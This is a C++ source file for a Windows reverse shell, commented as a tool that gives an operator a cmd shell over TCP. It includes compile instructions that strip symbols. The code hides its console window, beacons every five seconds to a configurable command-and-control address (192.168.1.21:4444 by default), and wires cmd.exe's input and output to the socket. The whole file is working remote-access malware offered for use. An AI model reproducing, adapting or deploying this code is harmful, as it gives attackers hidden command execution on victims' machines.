#include <iostream>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib,"Ws2_32.lib")

#define DEFAULT_BUFLEN 1024
#pragma warning(disable : 4996) //added this string because "WSAStartup(MAKEWORD(2,2), &version);" doesn't want to work 

using namespace std;

//This is a simple C++ based reverse shell give us a windows cmd shell over TCP.
//Maybe need to install mingw-w64
//To compile this you need to i686-w64-mingw32-g++ %Namefile%.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
//%Namefile% to need change 

void RunShell(char* C2Server, int C2Port) {
    while (true) {
        Sleep(5000);    // Five Second

        int iResult;
        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        iResult = WSAStartup(MAKEWORD(2,2), &version);
            if (iResult != 0) {
            printf("WSAStartup failed: %d\n", iResult);
            exit(1);
            }
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons(C2Port);

            if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
            }
            else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
                }
                else {
                wchar_t Process[] = L"C:\\WINDOWS\\System32\\cmd.exe //Q"; // need to echar_t because Ctreate process dont work
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                    if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                    }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

int main(int argc, char** argv) {
    FreeConsole();
    if (argc == 3) {
        int port = atoi(argv[2]);
        RunShell(argv[1], port);
    }
    else {
        char host[] = "192.168.1.21";  // change this to your ip address
        int port = 4444;               // chnage this to your open port
        RunShell(host, port);
    }
    return 0;
}